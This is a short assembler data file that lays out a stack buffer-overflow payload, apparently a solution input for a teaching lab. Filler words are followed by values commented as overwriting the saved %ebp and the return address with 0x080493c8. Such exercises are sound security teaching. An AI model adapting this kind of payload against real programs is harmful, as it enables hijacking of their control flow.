.align 2
.long 0x00000001
.long 0x00000002
.long 0x00000003
.long 0x00000004
.long 0x00000005
.long 0x00000006
.long 0x00000007
.long 0x00000008
.long 0x00000009
.long 0x0000000a
.word 0x0001        # now at %ebp
.long 0x0000000b    # overwrite %ebp
.long 0x080493c8    # overwrite return value
